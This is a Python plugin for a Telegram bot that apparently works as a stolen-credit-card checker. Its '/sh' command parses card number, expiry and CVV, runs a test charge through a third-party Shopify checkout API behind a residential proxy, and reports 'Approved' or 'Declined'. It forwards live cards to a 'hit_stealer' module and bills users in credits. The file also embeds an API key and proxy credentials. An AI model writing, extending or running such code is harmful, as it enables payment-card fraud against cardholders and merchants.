from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.enums import ChatType
import requests, re, time, httpx
from plugins.func.users_sql import *
from plugins.tools.hit_stealer import send_hit_if_approved
from datetime import date

session = requests.Session()

@Client.on_message(filters.command("sh", prefixes=["/", "."]))
async def cmd_sh(client, message):
    try:
        user_id = str(message.from_user.id)
        username = message.from_user.username or "None"
        chat_id = message.chat.id
        chat_type = message.chat.type

        regdata = fetchinfo(user_id)
        if not regdata:
            return await message.reply_text("❌ You are not registered. Use /register first.")

        role = regdata[2].upper() if regdata[2] else "FREE"
        credit = int(regdata[5] or 0)
        wait_time = int(regdata[6] or (15 if role == "FREE" else 5))
        antispam_time = int(regdata[7] or 0)
        now = int(time.time())

        if chat_type == ChatType.PRIVATE and role == "FREE":
            return await message.reply_text(
                "Premium Users Required ⚠️\n"
                "Only Premium Users can use this command in bot PM.\n"
                "Join group for free use:",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("Join Group", url="https://t.me/+Rl9oTRlGfbIwZDhk")]
                ]),
                disable_web_page_preview=True
            )

        GROUP = open("plugins/group.txt").read().splitlines()
        if chat_type in [ChatType.GROUP, ChatType.SUPERGROUP] and str(chat_id) not in GROUP:
            return await message.reply_text("❌ Unauthorized group. Contact admin.")

        if credit < 1:
            return await message.reply_text("❌ Insufficient credit.")
        if now - antispam_time < wait_time:
            return await message.reply_text(f"⏳ Wait {wait_time - (now - antispam_time)}s (AntiSpam)")

        cc_text = message.reply_to_message.text if message.reply_to_message else (
            message.text.split(maxsplit=1)[1] if len(message.text.split()) > 1 else None
        )
        if not cc_text:
            return await message.reply_text("❌ Usage: /sh <cc|mm|yy|cvv>")

        match = re.search(r'(\d{12,16})[|:\s,-](\d{1,2})[|:\s,-](\d{2,4})[|:\s,-](\d{3,4})', cc_text)
        if not match:
            return await message.reply_text("❌ Invalid format. Use cc|mm|yy|cvv")

        ccnum, mes, ano, cvv = match.groups()
        fullcc = f"{ccnum}|{mes}|{ano}|{cvv}"

        check_msg = await message.reply_text(f"""
<code>┏━━━━━━━⍟</code>
<b>┃  Shopify 0.99$</b>
<code>┗━━━━━━━━━━━⊛</code>
<b>⊙ CC:</b> <code>{fullcc}</code>
<b>⊙ Status:</b> Checking...
<b>⊙ Response:</b> Waiting...
""")

        tic = time.perf_counter()
        payload = {
            "key": "VDX-SHA2X-NZ0RS-O7HAM",
            "data": {
                "card": fullcc,
                "product_url": "https://godless.com/collections/the-drop-all-new-shit/products/dark-corners-on-flat-surfaces-by-adler-tittle",
                "email": None,
                "proxy": "proxy.rampageproxies.com:5000:package-1111111-country-us-city-bloomington-region-indiana:5671nuWwEPrHCw2t",
                "ship_address": None,
                "is_shippable": False
            }
        }

        try:
            async with httpx.AsyncClient(timeout=20) as http_client:
                res = await http_client.post("https://api.voidapi.xyz/v2/shopify_graphql", json=payload)
                response = res.json()
                msg_raw = response.get("message") or response.get("error") or "No response"
                msg_check = msg_raw.lower()
                card_status = "approved" if any(x in msg_check for x in ["processedreceipt", "zip", "avs", "charged"]) else "declined"
                card_message = msg_raw
        except Exception as e:
            card_status = "error"
            card_message = f"Request failed: {e}"

        toc = time.perf_counter()

        try:
            binres = session.get(f"https://api.voidex.dev/api/bin?bin={ccnum[:6]}", timeout=10).json()
            brand = binres.get("brand") or binres.get("scheme") or "UNKNOWN"
            type_ = binres.get("type", "N/A")
            level = binres.get("level", "N/A")
            bank = binres.get("bank", "N/A")
            country = binres.get("country_name", "N/A")
            flag = binres.get("country_flag", "🏳️")
        except:
            brand = type_ = level = bank = country = "N/A"
            flag = "🏳️"

        brand, type_, level, bank, country = [str(i or "N/A").upper() for i in [brand, type_, level, bank, country]]
        status = "Approved ✅" if card_status == "approved" else "Declined ❌"

        final_msg = f"""
<code>┏━━━━━━━⍟</code>
<b>┃  Shopify 0.99$ </b>
<code>┗━━━━━━━━━━━⊛</code>
<b>⊙ CC:</b> <code>{fullcc}</code>
<b>⊙ Status:</b> {status}
<b>⊙ Response:</b> {card_message}
<b>⊙ Bank:</b> {bank}
<b>⊚ Bin type:</b> {brand} - {type_} - {level}
<b>⊙ Country:</b> {country} {flag}
<b>⊙ Time:</b> {toc - tic:.2f}s
<b>❛ ━━━━・⌁ 𝑩𝑨𝑹𝑹𝒀 ⌁・━━━━ ❜</b>
"""

        await client.edit_message_text(chat_id, check_msg.id, final_msg)

        if "approved" in status.lower() or "live" in card_message.lower():
            await send_hit_if_approved(client, final_msg)

        updatedata(user_id, "credits", credit - 1)
        updatedata(user_id, "antispam_time", now)
        plan_expirychk(user_id)

    except Exception as e:
        await message.reply_text(f"❌ Error: {str(e)}")
